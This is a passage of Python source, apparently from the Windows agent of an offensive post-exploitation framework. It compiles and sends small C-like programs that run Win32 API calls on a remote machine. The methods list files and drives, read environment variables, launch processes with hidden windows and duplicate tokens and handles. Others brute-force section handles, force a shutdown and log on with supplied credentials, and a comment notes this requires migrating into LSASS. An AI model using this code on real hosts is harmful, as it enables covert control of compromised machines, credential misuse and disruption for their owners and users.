        try:
            #encode in windows-friendly format
            directory=directory.encode("utf-16-le")+"\x00\x00"
        except:
            devlog("win32", "Failed to encode directory %s!"%directory)

        vars={}
        vars["dir"]=directory
        self.clearfunctioncache()
        request=self.compile("""
        //start of code
        #import "local","sendint" as "sendint"
        #import "remote","kernel32.dll|SetCurrentDirectoryW" as "SetCurrentDirectoryW"
        #import "string","dir" as "dir"
        #import "local","debug" as "debug"

        void main()
        {
        int i;
        //debug();
        i=SetCurrentDirectoryW(dir); //return 0 on failure
        sendint(i);
        }
        """,vars)

        self.sendrequest(request)
        #print "Sent request"
        ret=sint32(self.readint())
        #print "Read int"
        self.leave()
        if not ret:
            return -1
        return 0


    def chdirA(self,dir):
        """
        inputs: the directory to chdir into
        outputs: returns -1 on failure, otherwise 0
        """
        #print "Doing chdir"
        vars={}
        vars["dir"]=dir
        self.clearfunctioncache()
        request=self.compile("""
        //start of code
        #import "local","sendint" as "sendint"
        #import "remote","msvcrt.dll|_chdir" as "chdir"
        #import "string","dir" as "dir"
        #import "local","debug" as "debug"

        void main()
        {
        int i;
        //debug();
        i=chdir(dir);
        sendint(i);
        }
        """,vars)

        self.sendrequest(request)
        #print "Sent request"
        ret=sint32(self.readint())
        #print "Read int"
        self.leave()
        return ret


    def getcwd(self):
        """
        inputs: none
        outputs: returns the current working directory as a string
        """
        vars={}
        self.clearfunctioncache()
        request=self.compile("""
        #import "remote", "kernel32.dll|GetCurrentDirectoryW" as "GetCurrentDirectoryW"
        #import "local","senddata2self" as "senddata2self"
        #import "local","memset" as "memset"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        //start of code
        void main()
        {
           int i;
           char dest[3060];
           memset(dest, 0, 3060);
           i=GetCurrentDirectoryW(1500,dest);
           sendint(i);
           if (i!=0) {
               //i has the length of the string in characters.
               i = i + 1;
               i = i * 2;
               senddata2self(dest, i); //in bytes, not characters - should include terminating null
               }
           else {
               i=GetLastError();
               sendint(i);
           }
        }
        """,vars)

        self.sendrequest(request)
        charnum=sint32(self.readint())
        if charnum == 0:
            errno=sint32(self.readint())
            devlog("win32", "errno from getcwd: %d"%errno)
            ret=""
        else:
            #read the buffer
            ret=self.readblock()
        self.leave()
        #print "Ret=%s"%repr(ret)
        #ret is a Wide Character buffer we need to translate into a unicode string - utf16
        try:
            ret=ret.decode("utf_16_le")[:charnum]
        except:
            devlog("win32","getcwd can't translate %s into unicode!"%repr(ret))

        return ret

    def GetTempPathA(self):
        vars = {}
        self.clearfunctioncache()
        request = self.compile("""
        #import "remote", "kernel32.dll|GetTempPathA" as "GetTempPathA"
        #import "local", "sendstring" as "sendstring"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"
        void
        main()
        {
            char tmp[512];
            int n;

            memset(tmp, 0, 512);
            n = GetTempPathA(512, tmp);
            sendint(n);
            if (n != 0)
            {
                sendstring(tmp);
            }
        }
        """)
        self.sendrequest(request)
        n = self.readint()
        tmp = ''
        if n:
            tmp = self.readstring()
        self.leave()
        return tmp

    def GetEnvironmentVariable(self,variablename):
        """
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/getenvironmentvariable.asp
        returns the environment variable
        """

        vars={}
        vars["envname"]=variablename
        code="""
        #import "remote", "kernel32.dll|GetEnvironmentVariableA" as "getenvironmentvariable"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "string","envname" as "envname"

        void main() {
          int ret;
          char outbuf[5000];
          ret=getenvironmentvariable(envname,outbuf,4999);
          sendint(ret);
          if (ret<5000) {
            sendstring(outbuf);
          }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readint()
        retbuffer=""
        if ret<5000:
            retbuffer=self.readstring()
        else:
            self.log("Getenv %s wanted %d bytes!"%(variablename,ret))
        self.leave()
        return retbuffer


    def dostat(self, filename):
        """
	Get size of file and other attributes given a filename
	"""

        devlog("win32","Getting stat of %s"%filename)
        if type(filename)!=type(u""):
            #not unicode? Do cast.
            filename=filename.decode("utf-8")

        vars        = {}
        #don't forget to null terminate! :>
        vars["dir"] = filename.encode("utf-16-le") + "\x00\x00"

        code="""
        #import "string","dir" as "dir"
        #import "local","sendunistring2self" as "sendunistring2self"
        #import "local","sendint" as "sendint"
        #import "remote", "kernel32.dll|FindFirstFileW" as "FindFirstFile"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"


        struct FILETIME {
           int dwLowDateTime;
           int dwHighDateTime;
        };

        struct WIN32_FIND_DATA {
           int dwFileAttributes;
           struct FILETIME ftCreationTime;
           struct FILETIME ftLastAccessTime;
           struct FILETIME ftLastWriteTime;
           int nFileSizeHigh;
           int nFileSizeLow;
           int dwReserved0;
           int dwReserved1;
           //unicode versions
           char cFileName[512];
           char cAlternateFileName[28];
           char pad[5000]; //testy testy
        };
        void sendFILETIME(struct FILETIME *ft) {
           sendint(ft->dwLowDateTime);
           sendint(ft->dwHighDateTime);
        }
        void main() {
            struct WIN32_FIND_DATA FindFileData;
            int hFind;
            int Error;

            hFind = -1;
            hFind = FindFirstFile(dir, &FindFileData);
            if(hFind == -1) {
               // We send a -1 mean there is no more file to send
               Error=GetLastError();
               sendint(-1);
               sendint(Error);
               return 0;
            } else {
               sendint(FindFileData.dwFileAttributes);
               sendint(FindFileData.nFileSizeLow);
               sendFILETIME(&FindFileData.ftLastWriteTime);
               sendunistring2self(FindFileData.cFileName);
            }
        }

        """
        self.clearfunctioncache()
        request=self.compile(code, vars)
        self.sendrequest(request)
        countfile = 0
        files     = []

        attr = sint32(self.readint())
        if attr == -1:
            error          = sint32(self.readint())
            devlog("win32", "Stat reported error: %x"%error)
            #error of "2" indicates no file found!
            size           = error
            ftCreationTime = error
            filename       = "error"
        else:
            size           = sint32(self.readint())
            ftCreationTime = self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
            filename       = self.readblock()
            #this is unicode
            filename = filename.decode("utf-16-le")

            countfile     += 1

        self.leave()

        return (attr, size, ftCreationTime, filename)

    # Listing the files in a directory:
    #  http://msdn.microsoft.com/library/default.asp?url=/library/en-us/fileio/base/listing_the_files_in_a_directory.asp
    def dodir(self, directory):
        """
	Get directory listings from a directory on the remote machine.
	"""

        if type(directory)!=type(u""):
            #not unicode? Do cast.
            directory=directory.decode("utf-8")

        if directory[:-2]!=u"\\*":
            #add trailer so it works (it doesn't automatically assume this in the API like you would expect)
            directory+= u"\\*"

        vars={}
        #add null terminator
        vars["dir"]=directory.encode("utf-16-le")+"\x00\x00"
        self.log("Getting directory listing: %s"%directory)
        code="""
        #import "string","dir" as "dir"
        #import "local","sendunistring2self" as "sendunistring2self"
        #import "local","sendint" as "sendint"
        #import "remote", "kernel32.dll|FindFirstFileW" as "FindFirstFileW"
        #import "remote", "kernel32.dll|FindNextFileW" as "FindNextFileW"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"
        #import "remote", "kernel32.dll|FindClose" as "FindClose"
        #import "local","memset" as "memset"


        struct FILETIME {
           int dwLowDateTime;
           int dwHighDateTime;
        };

        struct WIN32_FIND_DATA {
           int dwFileAttributes;
           struct FILETIME ftCreationTime;
           struct FILETIME ftLastAccessTime;
           struct FILETIME ftLastWriteTime;
           int nFileSizeHigh;
           int nFileSizeLow;
           int dwReserved0;
           int dwReserved1;
           char cFileName[512]; //should be MAX_PATH (using short here for tchar)
           char cAlternateFileName[28];
           char PAD[5000];
        };

        void sendFILETIME(struct FILETIME *ft) {
           // filetimes are basically two "longs" to us
           sendint(ft->dwLowDateTime);
           sendint(ft->dwHighDateTime);
        }

        void main() {
            struct WIN32_FIND_DATA FindFileData;
            int hFind;
            int Error;

            //we just sort of run zeros into the padding here
            memset(&FindFileData, 0, 2000);

            hFind = -1;
            hFind = FindFirstFileW(dir, &FindFileData);
            if(hFind == -1) {
               // We send a -1 to indicate there are no more files to send
               sendint(-1);
               Error=GetLastError();
               sendint(Error);
               return 0;
            } else {
               sendint(FindFileData.dwFileAttributes);
               sendint(FindFileData.nFileSizeLow);
               sendFILETIME(&FindFileData.ftLastWriteTime);
               sendunistring2self(FindFileData.cFileName);

            }

            //we just sort of run zeros into the padding here
            memset(&FindFileData, 0, 2000);

            while (FindNextFileW(hFind, &FindFileData) != 0)
            {
               sendint(FindFileData.dwFileAttributes);
               sendint(FindFileData.nFileSizeLow);
               sendFILETIME(&FindFileData.ftLastWriteTime);
               sendunistring2self(FindFileData.cFileName);
               //we just sort of run zeros into the padding here
               memset(&FindFileData, 0, 2000);

            }
            Error = GetLastError();
            sendint(-1);
            sendint(Error); // IF ERROR_NO_MORE_FILE everything works ok :>
            FindClose(hFind);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code, vars)
        self.sendrequest(request)
        countfile=0
        files=[]
        while 1:
            attr = sint32(self.readint())
            if attr == -1:
                break

            size= sint32(self.readint())
            ftCreationTime=self.readstruct([("l","dwLowDateTime"),("l","dwHighDateTime")])
            filename = self.readblock()
            #filename is really utf-16-le encoded
            filename = filename.decode("utf-16-le")
            files.append((attr, size,ftCreationTime, filename))
            countfile+=1

        error=sint32(self.readint())
        self.leave()
        devlog("win32", "Done getting directory listing of %s"%directory)
        if error == 18:
            return (countfile, files)
        else:
            return (-1, [error, directory])


    def recursive_dir_walk(self, path, function, func_arg=None):
        """
        Given a starting point recursively walk the path performing the specified option when files are found
        and walking deeper down when directories are found.
        This is probably far from an efficient algorithm, but whatever it works .....
        """
        ##dodir either returns (num_entries !=0, (({prop_dict},path),...)) or (-1||0, [err code, path] )
        num_entries, dir_ret=self.dodir(path)

        if num_entries == -1:
            ##It was not a directory, so we assume it was a file
            try:
                if not func_arg:
                    function(dir_ret[1][:-2])
                else:
                    function(dir_ret[1][:-2], func_arg)
            except NodeCommandError, err:
                #print "PROBLEM: %s"%err
                pass


        else:
            for n in dir_ret:
                ##It was a directory so we query further
                if n[-1] == "." or n[-1] == "..":
                    continue
                self.recursive_dir_walk( "%s\\%s"%(path,n[-1]), function, func_arg)


    def CreatePipe(self):
        """
        Calls CreatePipe and returns a tuple (return code, read pipe, write pipe)
        """

        vars={}
        code="""
        #import "remote", "kernel32.dll|CreatePipe" as "createpipe"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"

        struct SECURITY_ATTRIBUTES {
          int nLength;
          int * lpSecurityDescriptor;
          int bInheritHandle;
        };

        void main() {
          struct SECURITY_ATTRIBUTES sa;
          int ret;
          int readpipe;
          int writepipe;

          sa.nLength=12;
          sa.lpSecurityDescriptor=0;
          sa.bInheritHandle=1;

          ret=createpipe(&readpipe,&writepipe,&sa,0);
          sendint(ret);
          sendint(readpipe);
          sendint(writepipe);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=sint32(self.readint())
        readpipe=self.readint()
        writepipe=self.readint()
        self.leave()
        return (ret,readpipe,writepipe)

    def ExitWindows(self, flags=None):
        if flags==None:
            flags=0x00000008 #shutdown

        vars={}
        vars["flags"]=flags
        code="""
        #import "remote", "user32.dll|ExitWindowsEx" as "ExitWindowsEx"
        #import "local", "sendint" as "sendint"
        #import "int", "flags" as "flags"

        void main() {
          int ret;
          //power failure - sorry :>
          ret=ExitWindowsEx(flags,0x00060000);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def getComSpec(self):
        if self.cached_comspec!="":
            return self.cached_comspec
        self.cached_comspec=self.GetEnvironmentVariable("COMSPEC")
        logging.info("Set cached_comspec to %s" % self.cached_comspec)
        return self.cached_comspec

    def GetCurrentProcess(self):

        if self.currentprocess!=None:
            return self.currentprocess


        vars={}
        code="""
        #import "remote", "kernel32.dll|GetCurrentProcess" as "getcurrentprocess"
        #import "local","sendint" as "sendint"

        void main() {
          int ret;

          ret=getcurrentprocess();
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)

        self.sendrequest(request)

        ret=self.readint()
        self.leave()
        return ret

    def getNextMappableHandle(self, hMap, max):
        vars={}
        vars["handle"]=hMap
        vars["max"]=max
        code="""
        #import "remote","kernel32.dll|MapViewOfFile" as "MapViewOfFile"
        #import "local","sendint" as "sendint"
        #import "int","handle" as "handle"
        #import "int","max" as "max"
        #import "remote","ntdll.dll|ZwQuerySection" as "QuerySection"

        void main() {
          int ret;
          int done;
          int hMap;
          char buf[8];

          hMap=handle;
          done=0;
          while (done==0) {
             ret=MapViewOfFile(hMap,0xf001f,0,0,0);
             if (ret!=0) {
                     done=1;
                     sendint(hMap);
                     sendint(ret);
             }
             hMap=hMap+1;
             if (hMap==max) {
                 done=1;
             }
          }
          sendint(0);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)

        self.sendrequest(request)

        ret=self.readint()
        addr=None
        if ret!=0:
            addr=self.readint()
            zero=self.readint()
        self.leave()
        #returns 0 or hMap
        return ret, addr


    def CloseHandle(self,handle):
        """
        Closes the handle

        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/closehandle.asp
        Success is ret==non zero
        Doh: Windows NT/2000/XP:  Closing an invalid handle raises an exception when the application is running under a debugger.
        This includes closing a handle twice, and using CloseHandle on a handle returned by the FindFirstFile function.
        """
        return sint32(self.singleVariableFunction("kernel32.dll|CloseHandle",handle))

    def noVariableFunction(self,function,rettype="int",nosend=0):
        vars={}


        code="""
        //start of code
        #import "remote","FUNCTION" as "function"
        #import "local", "sendint" as "sendint"
        #import "local", "sendstring" as "sendstring"
        void main()
        {
            RETTYPE i;
            i=function();
        """
        if nosend:
            code+="""
            }
            """
        else:
            if rettype=="string":
                code+="""
                sendstring(i);
                }
                """
            elif rettype=="int":
                code+="""
                sendint(i);
                }
                """
            else:
                logging.warning("Unknown rettype: %s" % rettype)
        code=code.replace("FUNCTION",function)
        if rettype=="string":
            code=code.replace("RETTYPE","char *")
        elif rettype=="int":
            code=code.replace("RETTYPE","int")
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=None
        if not nosend:
            if rettype=="int":
                ret=self.readint() #we're gone!
            elif rettype=="string":
                ret=self.readstring()

        self.leave()
        return ret

    def singleVariableFunction(self,function,variable,vartype="int",nosend=0):
        vars={}
        vars["variable"]=variable


        code="""
        //start of code
        #import "remote","FUNCTION" as "function"
        #import "VARTYPE","variable" as "variable"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            i=function(variable);
        """
        if nosend:
            code+="""
            }
            """
        else:
            code+="""
            sendint(i);
            }
            """
        code=code.replace("FUNCTION",function)
        code=code.replace("VARTYPE",vartype)
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=None
        if not nosend:
            ret=self.readint() #we're gone!
        self.leave()
        return ret


    def twoVariableFunction(self,function,variable,variable2,vartype="int",nosend=0):
        vars={}
        vars["variable"]=variable
        vars["variable2"]=variable2


        code="""
        //start of code
        #import "remote","FUNCTION" as "function"
        #import "VARTYPE","variable" as "variable"
        #import "VARTYPE","variable2" as "variable2"

        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            i=function(variable,variable2);
        """
        if nosend:
            code+="""
            }
            """
        else:
            code+="""
            sendint(i);
            }
            """
        code=code.replace("FUNCTION",function)
        code=code.replace("VARTYPE",vartype)

        #for debug
        #print "TwoVariable Code: %s"%code

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=None
        if not nosend:
            ret=self.readint() #we're gone!
        self.leave()
        return ret

    def DuplicateToken(self, hExistingToken, ImpersonationLevel=None, dwDesiredAccess=0xc, TokenType=None):
        """
        Calls DuplicateTokenEx and does a bit of adjustment. Also gets the
        error result if applicable. Success is non-zero retval.
        http://msdn.microsoft.com/en-us/library/aa446617(VS.85).aspx
        """

        if ImpersonationLevel == None:
            ImpersonationLevel = SecurityImpersonation # global define

        if TokenType == None:
            TokenType = TokenImpersonation # global define

        vars = {}

        vars["hExistingToken"] = hExistingToken
        vars["ImpersonationLevel"] = ImpersonationLevel
        vars["dwDesiredAccess"] = dwDesiredAccess
        vars["TokenType"] = TokenType

        code = """
        #import "remote", "advapi32.dll|DuplicateTokenEx" as "DuplicateTokenEx"
        #import "local","sendint" as "sendint"

        #import "int", "hExistingToken" as "hExistingToken"
        #import "int", "ImpersonationLevel" as "ImpersonationLevel"
        #import "int", "dwDesiredAccess" as "dwDesiredAccess"
        #import "int", "TokenType" as "TokenType"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        void main()
        {
            int ret;
            int hNewToken;
            int lpTokenAttributes;
            int error;

            lpTokenAttributes = 0;
            ret = DuplicateTokenEx(hExistingToken, dwDesiredAccess, lpTokenAttributes, ImpersonationLevel, TokenType, &hNewToken);
            error = GetLastError();
            sendint(ret);
            if (ret != 0)
            {
                // success
                sendint(hNewToken);
            }
            else {
                //failure
                sendint(error);
            }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        ret = sint32(self.readint())

        #or potentially error value if ret=0
        newtoken = self.readint()

        self.leave()

        return ret,newtoken

    def DuplicateHandle(self,handle,sourceprocess=None,destprocess=None,inheritable=0,access=DUPLICATE_SAME_ACCESS):
        """
        duplicates the handle
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/sysinfo/base/duplicatehandle.asp
        """

        if sourceprocess==None:
            sourceprocess=self.GetCurrentProcess()

        if destprocess==None:
            destprocess=self.GetCurrentProcess()


        vars={}
        vars["sourceprocess"]=sourceprocess
        vars["sourcehandle"]=handle
        vars["targetprocess"]=destprocess
        vars["desiredaccess"]=access
        vars["options"]=DUPLICATE_SAME_ACCESS
        vars["inherithandle"]=inheritable
        code="""
        #import "remote", "kernel32.dll|DuplicateHandle" as "duplicatehandle"
        #import "local","sendint" as "sendint"
        #import "int", "sourceprocess" as "sourceprocess"
        #import "int", "targetprocess" as "targetprocess"
        #import "int", "sourcehandle" as "sourcehandle"
        #import "int", "desiredaccess" as "desiredaccess"
        #import "int", "options" as "options"
        #import "int", "inherithandle" as "inherithandle"

        void main() {
          int ret;
          int newhandle;

          ret=duplicatehandle(sourceprocess,sourcehandle,targetprocess,&newhandle,desiredaccess,inherithandle,options);
          sendint(ret);
          sendint(newhandle);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=sint32(self.readint())
        newhandle=self.readint()
        self.leave()
        return (ret, newhandle)


    def GlobalMemoryStatus( self ):
        vars={}

        code="""
        #import "remote", "kernel32.dll|GlobalMemoryStatusEx" as "GlobalMemoryStatusEx"

        #import "local","sendint" as "sendint"

        struct MEMORYSTATUSEX {

        int dwLength;
        int dwMemoryLoad;
        int ullTotalPhysLow;
        int ullTotalPhysHigh;
        int ullAvailPhysLow;
        int ullAvailPhysHigh;
        int ullTotalPageFileLow;
        int ullTotalPageFileHigh;
        int ullAvailPageFileLow;
        int ullAvailPageFileHigh;
        int ullTotalVirtualLow;
        int ullTotalVirtualHigh;
        int ullAvailVirtualLow;
        int ullAvailVirtualHigh;
        int ullAvailExtendedVirtualLow;
        int ullAvailExtendedVirtualHigh;
        };


        void main() {

          struct MEMORYSTATUSEX memstat;

          memstat.dwLength = 64;

          GlobalMemoryStatusEx(&memstat);

          sendint(memstat.ullTotalPhysLow);
          sendint(memstat.ullTotalPhysHigh);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=self.readstruct([("l","ullTotalPhysLow"),("l","ullTotalPhysHigh")])
        self.leave()

        return ret


    def CreateProcessA(self,command,inherithandles=0, dwCreationFlags=0x00000000):

        vars={}
        #cnt = command.rfind("\\")
        #if cnt != -1:
        #    lpAplicationName = command[cnt+1:]
        #else:
        #we pass in None which results in a NULL pointer, which makes CreateProcessA do the work for us
        #if you have a space in your string, you'll need to put quotes around it.
        vars["lpAplicationName"]=None
        vars["command"]=command
        vars["inherithandles"]=inherithandles
        vars["creationflags"] = dwCreationFlags

        #print "CreateProcessA() -> lpAp: %s command: %s"%(vars["lpAplicationName"], command)
        code="""
        #import "remote", "kernel32.dll|CreateProcessA" as "CreateProcessA"
        #import "remote","kernel32.dll|GetStartupInfoA" as "getstartupinfoa"
        #import "local", "memset" as "memset"

        #import "local","sendint" as "sendint"
        #import "string", "command" as "command"
        #import "string", "lpAplicationName" as "lpAplicationName"
        #import "int", "inherithandles" as "inherithandles"
        #import "int", "creationflags" as "creationflags"

        struct STARTUPINFO {
        int cb;
        char * lpReserved;
        char * lpDesktop;
        char * lpTitle;
        int dwX;
        int dwY;
        int dwXSize;
        int dwYSize;
        int dwXCountChars;
        int dwYCountChars;
        int dwFillAttribute;
        int dwFlags;
        short int wShowWindow;
        short int cbReserved2;
        int * lpReserved2;
        int hStdInput;
        int hStdOutput;
        int hStdError;
        };

        void main() {
          struct STARTUPINFO si;
          int i;
          char pi[32];

          memset(pi,0,16);

          getstartupinfoa(&si);
          si.dwFlags=0x0001; //STARTF_USESHOWWINDOW
          si.wShowWindow=0;

          // CreateProcess: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createprocess.asp
          i=CreateProcessA(lpAplicationName,command,0,0,inherithandles,creationflags,0,0,&si,pi);
          sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret=sint32(self.readint())
        self.leave()
        return ret

    def GetDrives(self):
        """
	Get list of drives and their types and (TODO: free space)
	"""
        vars={}
        self.clearfunctioncache()
        request=self.compile("""
        //start of code
        #import "local","sendint" as "sendint"
        #import "remote","kernel32.dll|GetLogicalDriveStringsW" as "GetLogicalDriveStringsW"
        #import "remote","kernel32.dll|GetDriveTypeW" as "GetDriveTypeW"

        #import "remote","kernel32.dll|GlobalAlloc" as "GlobalAlloc"
        #import "remote","kernel32.dll|GlobalFree" as "GlobalFree"
        #import "remote","msvcrt.dll|wcslen" as "wcslen"
        #import "local","debug" as "debug"
        #import "local","sendunistring2self" as "sendunistring2self"

        void main()
        {
            //should be plenty (famous last words)
            short * buffer;
            char * p;
            short currentchar;
            int i;
            int len;
            int drive_type;

            //debug();
            i=GetLogicalDriveStringsW(0, 0); //Get size
            i=i+1;
            buffer=GlobalAlloc(0x40, i*2); //allocate enough space
            i=GetLogicalDriveStringsW(i, buffer); //Get actual buffer
            //i is the size of the used buffer in bytes
            p=buffer;
            currentchar=*p;
            while (currentchar != 0 ) {
                sendint(1); //about to send a string!
                sendunistring2self(p);

                //now get type
                drive_type=GetDriveTypeW(p);
                sendint(drive_type);


                //now increment pointer. A little weird because of MOSDEF. wcslen(p)*2 fails. :<
                len=wcslen(p);
                len=len*2;
                p=p+len;
                p=p+2; //past null
                currentchar = *p;
            }
            sendint(0); // done sending drive strings
            GlobalFree(buffer);
        }
        """,vars)

        self.sendrequest(request)
        #print "Sent request"
        sending_drive_string=self.readint()
        devlog("win32", "sending_string=: %d"%sending_drive_string)
        drives=[]
        while sending_drive_string:
            drive_string=self.read_uni_string()
            devlog("win32", "Got drive_string: %s"%drive_string)
            drive_type=self.readint()

            #now replace with a string
            for key in DRIVE_TYPES.keys():
                if DRIVE_TYPES[key]==drive_type:
                    drive_type=key
                    break

            drives+=[(drive_string,drive_type)]
            sending_drive_string=self.readint()
            devlog("win32", "sending_string=: %d"%sending_drive_string)

        self.leave()

        return drives

    def LogonUser(self, lpszUsername, lpszPassword, lpszDomain=None, dwLogonType=LOGON32_LOGON_INTERACTIVE, dwLogonProvider=LOGON32_PROVIDER_DEFAULT):
        """
        http://msdn2.microsoft.com/en-us/library/aa378184(VS.85).aspx

        This requires SeTcbPrivileges .. so you have to migrate into e.g. LSASS for it to work and give you a token!
        """
        vars={}

        vars["lpszUsername"] = lpszUsername
        vars["lpszPassword"] = lpszPassword

        if '@' in lpszUsername: # upn formatted .. domain == NULL
            vars["lpszDomain"] = ""
            vars["setDomain"] = 0

        elif lpszDomain != None: # domain hardset
            vars["lpszDomain"] = lpszDomain
            vars["setDomain"] = 1

        else: # get the local domain automagically ..

            domain_vars = {}
            domain_code = """
            #import "remote", "advapi32.dll|LookupAccountNameA" as "LookupAccountName"
            #import "remote", "advapi32.dll|GetUserNameA" as "GetUserName"
            #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

            #import "local", "sendint" as "sendint"
            #import "local", "sendstring" as "sendstring"

            // is actually an enum .. but whatever
            struct SID_NAME_USE_fakenum {
                int SidTypeUser;
                int SidTypeGroup;
                int SidTypeDomain;
                int SidTypeAlias;
                int SidTypeWellKnownGroup;
                int SidTypeDeletedAccount;
                int SidTypeInvalid;
                int SidTypeUnknown;
                int SidTypeComputer;
                int SidTypeLabel;
            };

            void main()
            {
                struct SID_NAME_USE_fakenum psid_name_use;

                char lpAccountName[512];
                char lpDomainName[512];
                char SID[512]; // just a placeholder for the struct muck
                int n;
                int i;
                int ret;
                int err;

                psid_name_use.SidTypeUser = 1;

                n = 512;
                ret = GetUserName(lpAccountName, &n);
                sendint(ret);
                if (ret == 0)
                {
                    err = GetLastError();
                    sendint(err);
                }
                else
                {
                    sendstring(lpAccountName); // send account name

                    // lookup account muck
                    n = 512;
                    i = 512;
                    ret = LookupAccountName(0, lpAccountName, SID, &i, lpDomainName, &n, &psid_name_use);
                    err = 0;
                    sendint(ret);
                    if (ret == 0)
                    {
                        err = GetLastError();
                        sendint(err);
                    }
                    else
                    {
                        sendstring(lpDomainName);
                    }
                }
            }

            """

            self.clearfunctioncache()
            request = self.compile(domain_code, domain_vars)
            self.sendrequest(request)

            # getusername call
            ret = sint32(self.readint())
            if ret == 0: # failed
                err = sint32(self.readint())
                logging.debug("GetUserName() Failed! (ERROR: %X)" % err)

            else: # success .. lookupaccountname call
                UserName = self.readstring()
                logging.debug("GetUserName() Worked! (RETVL: %X - USER: %s)" % (ret, UserName))

                ret = sint32(self.readint())
                if ret == 0: # failed
                    err = sint32(self.readint())
                    logging.debug("LookupAccountName() Failed! (ERROR: %X)" % err)

                else: # success read domain string
                    lpszDomain = self.readstring()
                    logging.debug("Got Local Domain: %s" % lpszDomain)

            self.leave()

            vars["lpszDomain"] = lpszDomain
            vars["setDomain"] = 1

        vars["dwLogonType"] = dwLogonType
        vars["dwLogonProvider"] = dwLogonProvider

        code="""
        #import "remote", "advapi32.dll|LogonUserA" as "LogonUser"
        #import "remote", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local","sendint" as "sendint"

        #import "string", "lpszUsername" as "lpszUsername"
        #import "string", "lpszPassword" as "lpszPassword"
        #import "string", "lpszDomain" as "lpszDomain"

        #import "int", "dwLogonType" as "dwLogonType"
        #import "int", "dwLogonProvider" as "dwLogonProvider"

        #import "int", "setDomain" as "setDomain"

        void main()
        {
            int ret;
            int err;
            int phToken;

            // ASCII for now so we can test until we figure out the unicode muck
            if (setDomain == 1)
            {
                ret = LogonUser(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, &phToken);
            }
            else
            {
                ret = LogonUser(lpszUsername, 0, lpszPassword, dwLogonType, dwLogonProvider, &phToken);
            }

            sendint(ret); // return val
            sendint(err); // error code if any
            sendint(phToken); // token handle
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        ret = sint32(self.readint())
        err = sint32(self.readint())
        phToken = sint32(self.readint())

        self.leave()

        return (ret,err,phToken,lpszDomain)

    def CreateProcessAsUser(self, hToken, lpCommandLine, lpUsername, lpPassword, domain="",bInheritHandles=0, dwCreationFlags=0x00000000):
        """
        http://msdn2.microsoft.com/en-us/library/ms682429.aspx

        NOTE: This is not currently working, it returns an 0x0 as a result
        as well it returns ERROR_SUCCESS but never actually spawns the process.
        Dave is gonna fix it :)
        """

        vars = {}

        vars["lpAplicationName"] = None
        vars["lpCommandLine"]    = msunistring(lpCommandLine)
        vars["bInheritHandles"]  = bInheritHandles
        vars["dwCreationFlags"]  = 0x400 | 0x10
        vars["lpUsername"]       = msunistring(lpUsername)
        vars["lpPassword"]       = msunistring(lpPassword)
        vars["lpDomain"]         = msunistring(domain)
        vars["hToken"]           = hToken
        logging.debug(repr( vars ))
        #print "CreateProcessAsUser() -> lpAp: %s command: %s"%(vars["lpAplicationName"], command)

        code="""
        #import "remote", "advapi32.dll|CreateProcessWithLogonW" as "CreateProcessAsUser"
        #import "remote", "advapi32.dll|ImpersonateLoggedOnUser" as "ImpersonateLoggedOnUser"
        #import "remote", "userenv.dll|CreateEnvironmentBlock" as "CreateEnvironmentBlock"
        #import "remote", "userenv.dll|GetUserProfileDirectoryW" as "GetUserProfileDirectory"
        #import "remote","kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"
        #import "remote","kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "memset" as "memset"
        #import "local","sendint" as "sendint"

        #import "string", "lpCommandLine" as "lpCommandLine"
        #import "string", "lpAplicationName" as "lpAplicationName"
        #import "string", "lpUsername" as "lpUsername"
        #import "string", "lpPassword" as "lpPassword"
        #import "string", "lpDomain" as "lpDomain"
        #import "int", "bInheritHandles" as "bInheritHandles"
        #import "int", "dwCreationFlags" as "dwCreationFlags"
        #import "int", "hToken" as "hToken"

        struct STARTUPINFO {
            int cb;
            char * lpReserved;
            char * lpDesktop;
            char * lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            int * lpReserved2;
            int hStdInput;
            int hStdOutput;
            int hStdError;
        };

        void main()
        {
            struct STARTUPINFO lpStartupInfo;
            int ret;
            int err;
            int dwSize;
            char lpProcessInformation[32];
            char lpvEnv[256];
            char szUserProfile[256];

            dwSize = 128;

